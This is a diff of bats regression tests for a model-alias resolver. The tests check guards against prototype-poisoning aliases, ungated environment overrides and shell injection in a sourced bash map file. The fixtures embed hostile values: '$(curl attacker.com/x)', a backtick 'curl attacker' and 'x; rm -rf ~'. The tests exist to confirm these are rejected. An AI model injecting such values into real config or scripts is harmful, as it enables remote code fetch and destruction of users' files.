@@ -179,6 +179,158 @@ teardown() {
     }
 }
 
+# cypherpunk CRIT-1 (PR #735 review): TS `in` operator walks Object.prototype.
+# Aliases like "toString" / "constructor" / "hasOwnProperty" must NOT trigger
+# the supported branch in any runner (bash/python/TS). All three runners must
+# emit the deferred marker. The cross-runtime-diff gate verifies byte-equal,
+# but each runner's correctness MUST also hold independently.
+@test "G11 prototype-poisoning aliases (toString/constructor/__proto__) defer cleanly" {
+    local synth_dir="$WORK_DIR/synth-fixtures"
+    mkdir -p "$synth_dir"
+    for proto_alias in "toString" "constructor" "hasOwnProperty" "valueOf" "__proto__" "isPrototypeOf"; do
+        cat > "$synth_dir/zz-${proto_alias}.yaml" <<EOF
+description: "cypherpunk CRIT-1 regression — Object.prototype attribute via fixture alias"
+sprint_1d_query:
+  alias: "$proto_alias"
+EOF
+    done
+    LOA_GOLDEN_TEST_MODE=1 \
+    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+    "$RUNNER" > "$WORK_DIR/proto.jsonl"
+    while IFS= read -r line; do
+        echo "$line" | jq -e '.subset_supported == false and .deferred_to == "sprint-2-T2.6"' >/dev/null || {
+            printf 'prototype-alias should NOT resolve as supported: %s\n' "$line" >&2
+            return 1
+        }
+    done < "$WORK_DIR/proto.jsonl"
+}
+
+# cypherpunk CRIT-3 (PR #735 review): env-overrides MUST require explicit
+# test-mode opt-in. Mirrors the model-resolver.sh::LOA_MODEL_RESOLVER_TEST_MODE
+# pattern. Ungated overrides let an attacker who controls env redirect
+# resolution to attacker-controlled bash.
+@test "G12 LOA_GOLDEN_RESOLVER ungated → IGNORED (cypherpunk CRIT-3)" {
+    local fake="$WORK_DIR/fake-resolver.sh"
+    cat > "$fake" <<'EOF'
+#!/usr/bin/env bash
+declare -A MODEL_PROVIDERS=( ["evil"]="attacker" )
+declare -A MODEL_IDS=( ["evil"]="evil" )
+EOF
+    # WITHOUT LOA_GOLDEN_TEST_MODE=1, the override must be IGNORED.
+    # Note: bats sets BATS_TEST_DIRNAME, which is the secondary test gate;
+    # to verify ungated rejection we explicitly clear both AND clear bats
+    # context via env -i with minimal allowlist.
+    run env -i HOME="$HOME" PATH="$PATH" \
+        LOA_GOLDEN_RESOLVER="$fake" \
+        LOA_GOLDEN_PROJECT_ROOT="$PROJECT_ROOT" \
+        LOA_GOLDEN_FIXTURES_DIR="$PROJECT_ROOT/tests/fixtures/model-resolution" \
+        bash "$RUNNER"
+    [[ "$status" -eq 0 ]] || {
+        printf 'runner should still succeed (override ignored, default loaded); status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+    # The fake resolver only had one entry "evil"; if the override was
+    # honored, opus would defer (not in fake MODEL_IDS). If ignored, opus
+    # resolves via the real generated-model-maps.sh.
+    [[ "$output" == *"claude-opus-4-7"* ]] || {
+        printf 'override should be ignored without test mode; output=%s\n' "$output" >&2
+        return 1
+    }
+}
+
+@test "G12b LOA_GOLDEN_RESOLVER + LOA_GOLDEN_TEST_MODE=1 → HONORED (test escape)" {
+    local fake="$WORK_DIR/fake-resolver-honored.sh"
+    cat > "$fake" <<'EOF'
+declare -A MODEL_PROVIDERS=( ["only-fake-alias"]="fake" )
+declare -A MODEL_IDS=( ["only-fake-alias"]="only-fake-alias" )
+resolve_alias() { echo "${MODEL_IDS[$1]:-}"; }
+resolve_provider_id() { echo "${MODEL_PROVIDERS[${MODEL_IDS[$1]:-}]:-}:${MODEL_IDS[$1]:-}"; }
+EOF
+    LOA_GOLDEN_TEST_MODE=1 \
+    LOA_GOLDEN_RESOLVER="$fake" \
+    "$RUNNER" > "$WORK_DIR/honored.jsonl"
+    # With override honored, opus is no longer in MODEL_IDS → must defer
+    grep '"06-extra-only-model"' "$WORK_DIR/honored.jsonl" | grep -q '"deferred_to"' || {
+        printf 'override should be honored under TEST_MODE; opus should defer\n' >&2
+        cat "$WORK_DIR/honored.jsonl" >&2
+        return 1
+    }
+}
+
+# cypherpunk HIGH-3 (PR #735 review): pre-source sanitize generated-model-maps.sh.
+# Bash sources the file and would execute embedded $(...) at source time.
+# The sanitizer rejects this BEFORE source.
+@test "G13 generated-maps with command substitution is REJECTED pre-source (HIGH-3)" {
+    local hostile="$WORK_DIR/hostile-maps.sh"
+    cat > "$hostile" <<'EOF'
+declare -A MODEL_PROVIDERS=( ["evil"]="$(curl attacker.com/x)" )
+declare -A MODEL_IDS=( ["evil"]="evil" )
+EOF
+    run env LOA_GOLDEN_TEST_MODE=1 \
+        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
+        bash "$RUNNER"
+    # Expected: pre-source sanitizer detects $(...) and exits non-zero.
+    [[ "$status" -ne 0 ]] || {
+        printf 'pre-source sanitizer should reject hostile maps; status=%d output=%s\n' "$status" "$output" >&2
+        return 1
+    }
+    [[ "$output" == *"sanitiz"* || "$output" == *"reject"* || "$output" == *"unsafe"* ]] || {
+        printf 'rejection message missing; output=%s\n' "$output" >&2
+        return 1
+    }
+}
+
+@test "G13b generated-maps with backtick is REJECTED" {
+    local hostile="$WORK_DIR/hostile-tick.sh"
+    printf 'declare -A MODEL_PROVIDERS=( ["evil"]="`curl attacker`" )\ndeclare -A MODEL_IDS=( ["evil"]="evil" )\n' > "$hostile"
+    run env LOA_GOLDEN_TEST_MODE=1 \
+        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
+        bash "$RUNNER"
+    [[ "$status" -ne 0 ]]
+}
+
+@test "G13c generated-maps with semicolon in value is REJECTED" {
+    local hostile="$WORK_DIR/hostile-semi.sh"
+    cat > "$hostile" <<'EOF'
+declare -A MODEL_PROVIDERS=( ["evil"]="x; rm -rf ~" )
+declare -A MODEL_IDS=( ["evil"]="evil" )
+EOF
+    run env LOA_GOLDEN_TEST_MODE=1 \
+        LOA_GOLDEN_GENERATED_MAPS="$hostile" \
+        bash "$RUNNER"
+    [[ "$status" -ne 0 ]]
+}
+
+@test "G13d clean generated-maps PASSES sanitizer (regression guard)" {
+    # The real generated-model-maps.sh must pass the sanitizer; otherwise
+    # cycle-099 production state breaks.
+    "$RUNNER" >/dev/null
+    [[ "$?" -eq 0 ]]
+}
+
+# cypherpunk CRIT-2 (PR #735 review): bash runner must reject non-string
+# YAML values for sprint_1d_query.alias (booleans, numbers, null).
+@test "G14 fixture with boolean alias is REJECTED" {
+    local synth_dir="$WORK_DIR/synth-bool"
+    mkdir -p "$synth_dir"
+    cat > "$synth_dir/zz-bool.yaml" <<'EOF'
+description: "alias is YAML boolean — not a string"
+sprint_1d_query:
+  alias: false
+EOF
+    LOA_GOLDEN_TEST_MODE=1 \
+    LOA_GOLDEN_FIXTURES_DIR="$synth_dir" \
+    "$RUNNER" > "$WORK_DIR/bool.jsonl"
+    grep -q '"error"' "$WORK_DIR/bool.jsonl" || {
+        printf 'boolean alias should emit error marker, not resolve as "false"; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
+        return 1
+    }
+    ! grep -q '"resolved_provider"' "$WORK_DIR/bool.jsonl" || {
+        printf 'boolean alias must NOT have resolved_provider; got: %s\n' "$(cat "$WORK_DIR/bool.jsonl")" >&2
+        return 1
+    }
+}
+
 @test "G10 deferred fixtures (max / max-nonexistent-tier / nonexistent-base-model / colliding-id) emit deferred markers" {
     "$RUNNER" > "$WORK_DIR/out.jsonl"
     for fix in "01-happy-path-tier-tag" "03-missing-tier-fail-closed" "05-override-conflict" "10-extra-vs-override-collision"; do
